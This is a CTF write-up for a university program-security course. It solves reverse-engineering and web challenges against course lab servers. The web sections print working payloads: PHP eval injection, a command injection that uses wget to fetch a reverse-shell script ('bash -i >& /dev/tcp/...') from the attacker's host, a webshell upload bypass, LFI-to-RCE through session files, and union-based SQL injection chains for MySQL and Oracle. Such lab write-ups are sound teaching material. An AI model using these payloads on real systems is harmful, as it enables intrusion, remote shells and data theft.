# NCTU.108-1.program-security

## Lab 0x01
### What The Hell
`rev` `50 pts` `FLAG{BABY_REVERSE_123}`

> 跟地獄世界打招呼，摸摸找找 Flag 在哪。
> 
> [hellWorld.exe](https://edu-ctf.csie.org/files/hellWorld-42c3475ca77178982fac30821bbb480e.exe)  
> [whatTheHell.exe](https://edu-ctf.csie.org/files/whatTheHell-6eb0d34031d2621537169368490a28e0.exe)

1. IDA

   ```
   if ( argc != 1 && !strcmp(argv[1], "/get_flag") )
   ...
   ```

2. `$ whatTheHell.exe /get_flag`


## 0x01
### Back to the Future
`rev` `50 pts` `FLAG{PE_!S_EASY}`

> 一九八五年科學家聖豪成功在實驗室研製了軟體時光機，並將開發時光機的「核心機密」埋藏在時光機軟體中。
>
> 而時光機的機密因為保存技術而有半衰期會逐年衰變，逐漸變為看不懂的資訊，而時光機本身配有 Time Machine Guard 用來抵抗外來研究員嘗試分析破解時光機。
> 
> 請嘗試在不觸發 Time Machine Guard 的情況下回到過去盜取製造時光機的機密吧！！！
> 
> [KeyChecker.exe](https://edu-ctf.csie.org/files/KeyChecker-97d70caa80f4ab9e039f0d8899a5e4bb.exe)

1. 前面有複雜的運算跟條件，但其實最後 `Buffer` 就是 `byte_408008`，
   然後最後 `Buffer ^= byte_40801c`。
2. 因為 `byte_408008` 跟 `byte_40801c` 都已知，直接 xor 就有 flag。


## 0x02
### IDAmudamudamuda
`rev` `100 pts` `FLAG{y3s!!y3s!!y3s!!0h_my_g0d!!}`

> ShengHao’s HW1 was too kind, try this.
> 
> [IDAmudamudamuda.exe](https://edu-ctf.csie.org/files/IDAmudamudamuda-22a715976170be268162628bda2df09d.exe)

This program take two value as input.
One is `seed` and another is `flag`.
Use `<S-F12>` and `cross reference` in IDA to find main function.
There are two important functions related to the input,
which are `sub_5D1070(v1)` and `sub_5D1270(&v2)`.
`v1` is the `seed`, and `v2` is the `flag`.

`sub\_5D1070(char a1)` take `seed` as parameter.
Most of the code are complicated,
but only a small part of the function is related to the paramter.
> The whole function first search for `.data` segment, 
  and then find two blocks which start with `15` and `69` seperately.
> The first block is the comparison target, which is `unk_5D4018`.
> The second block will be used in `sub_5D1270`, and this is the seconde block.

```c
...
for ( l = j + 33; l < *(_DWORD *)(i + 8); ++l )
{
  if ( *(_BYTE *)(l + v8) == 69 )
  {
    for ( m = 0; ; ++m )
    {
      result = l + v8;
      if ( !*(_BYTE *)(l + v8 + m) )
        break;
      *(_BYTE *)(l + v8 + m) += a1;
    }
    return result;
  }
  result = l + 1;
}
...
```

The code shows that it will find `69` from `l + v8`,
    and start adding `seed` to each of the bytes until reaching `0`.
We can find the original data by the debugger.

```
\x45\x7b\xdc\x41\xb7\x35\xec\xf0\xf0\xf0\xf0\xdb\xf9\x7b\x35\xec\x73\xb0\xf1\x79\x35\xec\x7b\x3d\xfc\xf3\x3d\xec\xff\xae\x01\x75\xc2\x64\x15\x7b\x35\xf8\xf3\x35\xec\xff\xae\xf8\x73\xb1\x13\x73\xe1\x56\xff\xae\xc1\x7b\x35\xfc\xf3\x35\xec\xff\xae\xf8\x2b\xc1\x64\xf4\x23\xb0\xdb\xf7\xdb\xb5\xa8\xf1\xf0\xf0\xf0\x7b\xd5\x4d\xb3
```

`sub\_5D1270(const char \*a1)` will copy some data to `v2`
    and execute it as a function.
The data is the data mentioned in `sub_5D1070(char a1)`.

```c
...
if ( strlen(a1) == 32 )
{
  v2 = VirtualAlloc(0, 0xC8u, 0x1000u, 0x40u);
  qmemcpy(v2, &unk_5D4058, 0xC8u);
  result = ((int (__cdecl *)(const char *, void *))v2)(a1, &unk_5D4018);
}
...
```

The first command of a function usually is `push ebp`, which is `0x55`,
    and the first byte of the `data` is `0x45`.
Thus, the `seed` should be `16`, and we can get the function instructions.

```
 0:   55                      push   ebp
 1:   8b ec                   mov    ebp,esp
 3:   51                      push   ecx
 4:   c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
 b:   eb 09                   jmp    0x16
 d:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
10:   83 c0 01                add    eax,0x1
13:   89 45 fc                mov    DWORD PTR [ebp-0x4],eax
16:   8b 4d 0c                mov    ecx,DWORD PTR [ebp+0xc]
19:   03 4d fc                add    ecx,DWORD PTR [ebp-0x4]
1c:   0f be 11                movsx  edx,BYTE PTR [ecx]
1f:   85 d2                   test   edx,edx
21:   74 25                   je     0x48
23:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
26:   03 45 fc                add    eax,DWORD PTR [ebp-0x4]
29:   0f be 08                movsx  ecx,BYTE PTR [eax]
2c:   83 c1 23                add    ecx,0x23
2f:   83 f1 66                xor    ecx,0x66
32:   0f be d1                movsx  edx,cl
35:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
38:   03 45 fc                add    eax,DWORD PTR [ebp-0x4]
3b:   0f be 08                movsx  ecx,BYTE PTR [eax]
3e:   3b d1                   cmp    edx,ecx
40:   74 04                   je     0x46
42:   33 c0                   xor    eax,eax
44:   eb 07                   jmp    0x4d
46:   eb c5                   jmp    0xd
48:   b8 01 00 00 00          mov    eax,0x1
4d:   8b e5                   mov    esp,ebp
4f:   5d                      pop    ebp
50:   c3                      ret
```

We know `unk_5D4018`, and we can just reverse the calculation and get the flag.


## Lab 0x03
### sushi
`web` `50 pts` `FLAG{HaoChihDeSuSiZaiJhengSian}`

> 好ㄘ的蘇洗宰爭先
> 
> BGM: https://www.youtube.com/watch?v=uDeqxWRRKGk
> 
> [Link](https://edu-ctf.csie.org:10152/)

The php shows that it take `$_GET['🍣']` as input and pass it to `die()`.

```php
# cat index.php
<?php
// PHP is the best language for hacker
// Find the flag !!
highlight_file(__FILE__);
$_ = $_GET['🍣'];

if( strpos($_, '"') !== false || strpos($_, "'") !== false )
    die('Bad Hacker :(');

eval('die("' . substr($_, 0, 16) . '");');
```

There is a php magic `$msg = "${@phpinfo()}"`.
We can requeset `https://edu-ctf.csie.org:10152/?🍣=${@system(ls)}` and get file names.
> flag_name_1s_t00_l0ng_QAQQQQQQ index.php phpinfo.php

We can not use `${@system(cat flag_name_1s_t00_l0ng_QAQQQQQQ)}` because we can only input string length under 16.
But we can access the file directly through `https://edu-ctf.csie.org:10152/flag_name_1s_t00_l0ng_QAQQQQQQ` and get the flag.


### me0w
`web` `50 pts` `FLAG{me0w!m3ow!meow!}`

> 喵🐱🐈
> 
> [Link](https://edu-ctf.csie.org:10153/)

It is common to know that you can use `%0A` as a delimiter.
I use `curl` to verify that this is work.

The first thought is to use `nc` to create a reverse shell.
However, there is no `nc` on the server.
I want to use `bash -i >& /dev/tcp/<ip>/<port> 0>&1` to creat reverse shell,
but we can not use `>` and `&` because of the filter.


It comes to mind that
I can use `wget` to download the file with the cmd to the server,
    and execute it on the server.

First, create file server by `python -m http.server <port1>`.

```bash
bash -i >& /dev/tcp/$1/$2 0>&1
```

Then create listen port with `nc -vv -l -p <port2>` and query

```
https://edu-ctf.csie.org:10153/?me0w=index.php%0awget%20<ip>:<port1>/revshell.sh%20-O%20/tmp/revshell.sh%0abash%20/tmp/revshell.sh%20<ip>%20<port2>%0a
```


### No Password
`web` `50 pts` `FLAG{baby_first_sqlinj}`

> Login as admin!
> 
> [Link](https://edu-ctf.csie.org:10154/)

It's a simple SQLi, and the payload is shown on the page.
Both username and password input `a" or "a"="a`.


## 0x03
### Unexploitable
`web` `100 pts` `FLAG{baby_recon_dont_forget_to_look_github_page}`

> Exploit the unexploitable!
> 
> [Link](https://unexploitable.kaibro.tw/)

There is nothing useful Javascript, Cookies, or Headers.
Try to identify which type of web backend is used,
    and find out that this is an static page `https://unexploitable.kaibro.tw/index.html`.
Try to access `.git` or `.index.swp`,
    and find out that this is an GitHub Pages by the error page.

By the document of [Github Page](https://help.github.com/en/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site),
we can use `dig WWW.EXAMPLE.COM +nostats +nocomments +nocmd` to find original github page.

```
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> unexploitable.kaibro.tw +nostats +nocomments +nocmd
;; global options: +cmd
;unexploitable.kaibro.tw.       IN      A
unexploitable.kaibro.tw. 2993   IN      CNAME   bucharesti.github.io.
bucharesti.github.io.   2993    IN      A       185.199.110.153
bucharesti.github.io.   2993    IN      A       185.199.108.153
bucharesti.github.io.   2993    IN      A       185.199.109.153
bucharesti.github.io.   2993    IN      A       185.199.111.153
```

Access `github.com/bucharesti`, and there is nothing related to the `flag`.
Maybe the file had been deleted.
Try to find it in the commits,
    and find out that there is an commit called `delete secret file`.
The flag is in the file.


### Safe R/W
`web` `200 pts` `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`

> I implemented the safest php file reader/writer!
> 
> Hack me if you can :p
> 
> Ps. open_basedir=/var/www/html/
> 
> [Link](https://edu-ctf.csie.org:10155/)

First, the content length can be easily bypass with `c[]` instead of `c`.
We send normal and illegal payload at the same time to trigger race condition.

```bash
$ ./race.py | $ ./race.py '<?php system("ls -al /")'
$ ./race.py | $ ./race.py '<?php system("cat /flag_is_here")'
```


## Lab 0x04
### sh3ll\_upload3r
`web` `50 pts` `FLAG{simple_upload_practice_lol}`

> file upload is so dangerous!
> 
> [Link](https://edu-ctf.csie.org:10156/)

The web will check the file extension by `pathinfo`,
    and `pathinfo` will return only the last extension.
If we upload `file.php.jpg`,
    the web server will treat this file as php file and execute it 
    because `apache` server will keep finding the file extension from the back
    until it find a valid one.
After upload the file, access the uploaded file with `https://edu-ctf.csie.org:10156/upload/<filename>`


### EzLFI
`web` `50 pts` `FLAG{lfi_session_is_so_coool}`

There are two functions in the php code, which are `register` and `module`.
It is abvious that use `register` to write something and use `module` to load it.

First, we try to write `user=<?php phpinfo(); ?>` in the `$_SESSION['user']`.
We try to access default path of session files and failed.

```
https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/sessions/sess_<sessionID>
```

Then we try to access the location without `s`, and it works.

```
https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_<sessionID>
```

We change `<?php phpinfo(); ?>` to `<?php system("<cmd>"); ?>` and get the flag.


### EasyPeasy
`web` `50 pts` `FLAG{union_based_sqlinj_is_sooooooooo_easy}`

> Try your first Union-based SQL Injection!
> 
> [Link](https://edu-ctf.csie.org:10158/)

Use `1 and 2=2` to verify that this SQLi is number type.
Use `order by` to find out the number of columns.
Use `union select` to know which columns will be shown on the web page.

```
https://edu-ctf.csie.org:10158/news.php?id=1 and 2=2
https://edu-ctf.csie.org:10158/news.php?id=1 order by 3
https://edu-ctf.csie.org:10158/news.php?id=-1 union select 1,2,3
```

Find all information we need.

```
# show databases
https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(schema_name)%20from%20information_schema.schemata
/* information_schema,fl4g,mysql,news,test */

# show tables of fl4g
https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(table_name)%20from%20information_schema.tables%20where%20table_schema=%27fl4g%27
/* secret */

# show columns of fl4g.secret
https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,GROUP_CONCAT(column_name)%20from%20information_schema.columns%20where%20table_name=%27secret%27
/* id,THIS_IS_FLAG_YO */

# dump data in fl4g.secret.THIS_IS_FLAG_YO
https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,THIS_IS_FLAG_YO%20from%20fl4g.secret
/* FLAG{union_based_sqlinj_is_sooooooooo_easy} */
```

## 0x04
### Cathub v2
`web` `150` `FLAG{hey___or@cle_d4tab4s3__inj3cti0n_i5____to0OoO0ooO0OO_e4sy!!!!!??}`

> jin-duen-jiang is too easy, let's play cathub!
> 
> [Link](https://edu-ctf.csie.org:10159/)

There are two suspicious entrypoints,
    which are `index.php?search=` and `video.php?vid=`.
Try `video.php?vid=2-1` and get the same page of `video.php?vid=1`.

Then we try to get column number by using `video.php?vid=1 order by 1`
    and get blocked.
After some trial and find out that `space` is blocked.
We try to use `/**/` to bypass and finally know the column number is 3.

```
https://edu-ctf.csie.org:10159/video.php?vid=1/**/order/**/by/**/3
```

We try to use `union select 1,2,3` and get an error.
The database may not MySQL.
Then we try `union select NULL,NULL,NULL from dual` and succeed.

```
https://edu-ctf.csie.org:10159/video.php?vid=1/**/union/**/select/**/NULL,NULL,NULL/**/from/**/dual
```

Because the database is `oracle`, the column type must be correct.
We try `union select 1,USER,null`,
    and know we should put the expect result in the seconde column.

```
https://edu-ctf.csie.org:10159/video.php?vid=1/**/union/**/select/**/1,USER,NULL/**/from/**/dual
```

We try to get owners of tables, but we failed to use `rownum`.
> The reason is that `rownum` need to be used with subqueries.

```
https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/distinct/**/1,owner,NULL/**/from/**/all_tables
```

So we try to concat `rows` like `GROUP_CONCAT` in `MySQL`,
    and use `user_tables` instead of `all_tables`

```
https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(table_name,NULL)/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/user_tables
---
BONUSCAT_VIDEOSDEPTEMPS3CRETSALGRADE
```

Because we can not split the table name,
    we add some character between them with `to_char`.
> `CHR()` and `quote` are blocked.

```
https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(table_name,to_char(121))/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/user_tables
---
BONUS121CAT_VIDEOS121DEPT121EMP121S3CRET121SALGRADE
```

Use the same way to get column names.

```
https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(column_name,to_char(121))/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/USER_TAB_COLUMNS
---
COMM121ENAME121JOB121SAL121ID121NAME121URL121DEPTNO121DNAME121LOC121COMM121DEPTNO121EMPNO121ENAME121HIREDATE121JOB121MGR121SAL121ID121V3RY_S3CRET_C0LUMN121GRADE121HISAL121LOSAL
```

Use table name `s3cret` and column name `v3ry_s3cret_c0lumn`

```
https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,v3ry_s3cret_c0lumn,NULL/**/from/**/s3cret
---
FLAG{HEY___OR@CLE_D4TAB4S3__INJ3CTI0N_I5____TO0OOO0OOO0OO_E4SY!!!!!??}
```

The flag is render by CSS, the true flag is

```
FLAG{hey___or@cle_d4tab4s3__inj3cti0n_i5____to0OoO0ooO0OO_e4sy!!!!!??}
```
